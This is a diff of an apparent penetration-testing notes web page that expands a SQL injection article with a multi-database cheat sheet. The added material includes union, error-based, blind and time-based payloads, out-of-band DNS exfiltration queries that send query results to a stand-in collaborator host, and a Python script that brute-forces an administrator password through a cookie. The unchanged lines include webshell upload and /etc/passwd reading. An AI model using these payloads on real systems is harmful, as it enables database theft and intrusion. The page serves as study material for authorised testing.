@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level ">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -238,6 +294,8 @@
 									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
 								
 							</ul>
 						</li>
@@ -283,6 +341,286 @@
 			<article class="content">
 				<p>SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries.</p>
 
+<h1 id="cheat-sheet">Cheat Sheet</h1>
+
+<h2 id="string-concatenation">String Concatenation</h2>
+
+<p>We can concatenate together multiple strings to make a single strings. It also works to do a subquery</p>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'foo'||'bar'
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'foo'+'bar'
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'foo'||'bar'
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'foo' 'bar'
+CONCAT('foo', 'bar')
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<blockquote>
+  <p><strong>Note</strong>: It’s important while concatenating to only retrieve one element.</p>
+
+  <p><code class="highlighter-rouge">'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</code></p>
+</blockquote>
+
+<h2 id="substring">Substring</h2>
+
+<p>We can extract a part of a string, from a specified offset with a specified length.</p>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SUBSTR('foobar', 4, 2)
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SUBSTRING('foobar', 4, 2)
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SUBSTRING('foobar', 4, 2)
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SUBSTRING('foobar', 4, 2)
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="comments">Comments</h2>
+
+<p>We can use comment to truncate a query and remove the portion of the original query that follows our input.</p>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--comment
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--comment
+/*comment*/
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--comment
+/*comment*/
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#comment
+-- comment (space included)
+/*comment*/
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="database-version">Database Version</h2>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT banner FROM v$version
+SELECT version FROM v$instance
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT @@version
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT version()
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT @@version
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="database-contents">Database Contents</h2>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLENAME'
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="conditional-errors">Conditional Errors</h2>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END 
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END)
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="stacked-queries">Stacked Queries</h2>
+
+<p>We can use batched or stacked queries to execute multipels queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. This technique is primarily of use in realtion to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error or time delay.</p>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Does not support batched queries
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QUERY 1; QUERY 2
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QUERY 1; QUERY 2
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QUERY 1; QUERY 2
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="time-delays">Time Delays</h2>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dbms_pipe.receive_message(('a'),10)
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAITFOR DELAY '0:0:10' 
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT pg_sleep(10)
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT SLEEP(10) 
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="conditional-time-delays">Conditional Time Delays</h2>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END 
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="dns-lookup">DNS Lookup</h2>
+
+<p>We can cause the database to perform a DNS lookup to an external domain.</p>
+
+<ul>
+  <li><strong>Oracle</strong>: The following technique leverages an XXE vulnerability to trigger a DNS lookup. THe vulnerability has been patched but there are many unpatched Oracle installations in existence.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>The following payload works on fully patched oracle database but need elevated privileges.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') 
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' 
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>: Only on Windows.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT  INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="dns-lookup-with-data-exfiltration">DNS Lookup with data exfiltration</h2>
+
+<p>We can also use DNS lookups to exfiltrate data such as passwords or other fields of a table.</p>
+
+<ul>
+  <li><strong>Oracle</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Microsoft</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+</code></pre></div>    </div>
+  </li>
+  <li><strong>PostgreSQL</strong>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f(); 
+</code></pre></div>    </div>
+  </li>
+  <li><strong>MySQL</strong>: Only on Windows.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' 
+</code></pre></div>    </div>
+  </li>
+</ul>
+
 <h1 id="automatization-with-sqlmap">Automatization with sqlmap</h1>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Post
@@ -323,12 +661,23 @@ sqlmap -u http://example.com --dbms=mysql --crawl=3
 /index.php?id=1 order by 4 - ERROR
 </code></pre></div></div>
 
-<h2 id="output-layout">Output Layout</h2>
+<h2 id="finding-columns-with-a-useful-data-type">Finding Columns with a useful data type</h2>
 
 <p>Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?id=1 union all select 1, 2, 3
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?id=1 union all select NULL, NULL, NULL
 </code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: The reason for using <code class="highlighter-rouge">NULL</code> as the values returned from the injected <code class="highlighter-rouge">SELECT</code> query is that the data types in each column must be compatible between the original and the injected queries. <code class="highlighter-rouge">NULL</code> is convertible to every commonly used data type.</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+</code></pre></div></div>
+<p>If the data type of a column is not compatible with string data, the injected query will cause a database error.</p>
 
 <h2 id="extracting-data-from-database">Extracting Data from Database</h2>
 
@@ -347,8 +696,20 @@ sqlmap -u http://example.com --dbms=mysql --crawl=3
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?id=1 union all select 1, 2, load_file('/etc/passwd')
 </code></pre></div></div>
+<h2 id="retrieving-multiple-values-within-a-single-column">Retrieving multiple values within a single column</h2>
 
-<h2 id="from-sqli-to-rce">From SQLi to RCE</h2>
+<p>We can also concat multiple values for examples users and passwords and print on a single column.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' UNION SELECT username || '~' || password FROM users--
+</code></pre></div></div>
+
+<p>The output will be:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>administrator~s3cure
+wiener~peter
+carlos~montoya
+</code></pre></div></div>
+<h1 id="from-sqli-to-rce">From SQLi to RCE</h1>
 
 <p>Since we are allowed to upload files, we can upload a webshell to the web root.</p>
 
@@ -419,7 +780,7 @@ administrator'#
 
 <p><em>Example of Microsoft SQL Server:</em></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1', CONVERT(int,SELECT ...... FROM ....)
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1', CONVERT(int,SELECT  FROM .)
 
 a',convert(int,(SELECT CURRENT_USER)))--
 a',convert(int,(SELECT DB_NAME(0))))--
@@ -438,21 +799,98 @@ a',convert(int,(SELECT name from DATABASE..syscolumns WHERE id = (SELECT id FROM
 a',convert(int,(SELECT username FROM DATABASE..TABLE ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
 a',convert(int,(SELECT password FROM DATABASE..TABLE ORDER BY password OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
 </code></pre></div></div>
+<p><em>Example of MySQL:</em></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-- -)
+AND updatexml(rand(),concat(CHAR(126),user(),CHAR(126)),null)-- -)
+</code></pre></div></div>
 
 <h1 id="blind-sqli">Blind SQLi</h1>
 
 <p>A SQLi is blind because we don’t have access to the error log or any type of output which difficult a lot the process of exploitation.</p>
 
+<h2 id="triggering-conditional-responses">Triggering Conditional Responses</h2>
+
+<p>We are going to try to distinct the application response to a <code class="highlighter-rouge">TRUE</code> and <code class="highlighter-rouge">FALSE</code> query.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' AND '1'='1
+xyz' AND '1'='2
+</code></pre></div></div>
+<p>If we can get the difference of these two queries we can use substring to retrieve data.</p>
+
+<p>But first we need to know the lenght of the data to retrieve.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) &gt; 5 -- -
+xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 15 -- -
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) &gt;'m
+xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) ='s
+</code></pre></div></div>
+
+<p>The following is a python example script to automate the data retrieval of a alphanumerical 20 characters length password.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">results</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">letters</span> <span class="o">=</span> <span class="s">'1234567890zxcvbnmasdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP'</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"</span><span class="p">,</span> 
+		<span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"</span><span class="p">,</span> 
+		<span class="s">"Sec-Fetch-Site"</span><span class="p">:</span> <span class="s">"same-origin"</span><span class="p">,</span> 
+		<span class="s">"Sec-Fetch-Dest"</span><span class="p">:</span> <span class="s">"document"</span><span class="p">,</span> 
+		<span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span> <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span>
+	<span class="p">}</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"[!] Character </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
+	<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+		<span class="n">payload</span> <span class="o">=</span> <span class="s">"' AND SUBSTRING((SELECT username FROM users WHERE username='administrator'), </span><span class="si">%</span><span class="s">s,1) = '</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span> <span class="n">l</span><span class="p">)</span>
+		<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">"TrackingId"</span><span class="p">:</span> <span class="s">"Xv2KlSXeuXAWb9NQ"</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> 
+			<span class="s">"session"</span><span class="p">:</span> <span class="s">"iuxOBNDd4wHkhbbOiUVlQBHTv9AchuTu"</span>
+		<span class="p">}</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://example.com/sqli"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+		<span class="k">if</span> <span class="s">"Welcome back!"</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+			<span class="k">print</span><span class="p">(</span><span class="s">"  [+] Character Found: </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">l</span><span class="p">)</span>
+			<span class="n">results</span> <span class="o">+=</span> <span class="n">l</span>
+			<span class="k">break</span><span class="p">;</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[!] Finished"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Final results:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="conditional-responses-by-triggering-sql-errors">Conditional Responses by triggering SQL errors</h2>
+
+<p>If injecting different boolean conditions makes no difference to the application’s response we can force an error using the <code class="highlighter-rouge">1/0</code>.</p>
+
+<p>Example of a OracleDB query:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END) ||'a
+xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END) ||'a
+</code></pre></div></div>
+<p>If we can get the difference of these two queries we can use substring to retrieve data.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' || (SELECT CASE WHEN (LENGTH(password) &gt; 5) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
+xyz' || (SELECT CASE WHEN (LENGTH(password) = 15) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) &gt; 'm') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
+xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 's') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
+</code></pre></div></div>
+
 <h2 id="time-based">Time Based</h2>
 
 <p>Since we are not aware about any type of error or output we can use sleeps.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1-sleep(4)
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'; IF (1=2) WAITFOR DELAY '0:0:10'-- -
+'; IF (1=1) WAITFOR DELAY '0:0:10'-- -
 </code></pre></div></div>
 
 <p>If it loads for four seconds extra we know that the database is processing our <code class="highlighter-rouge">sleep()</code> command.</p>
 
-<h2 id="dump-tables">Dump tables</h2>
+<h3 id="dump-tables">Dump tables</h3>
 
 <p>It can also be done with sqlmap or manually with a custom script. In that case the script is dumping MD5 hashes from password field.</p>
 
@@ -484,6 +922,7 @@ print()
 <ul>
   <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks">https://portswigger.net/web-security/sql-injection/union-attacks</a></li>
   <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html">https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html</a></li>
+  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></li>
 </ul>
 
 			</article>
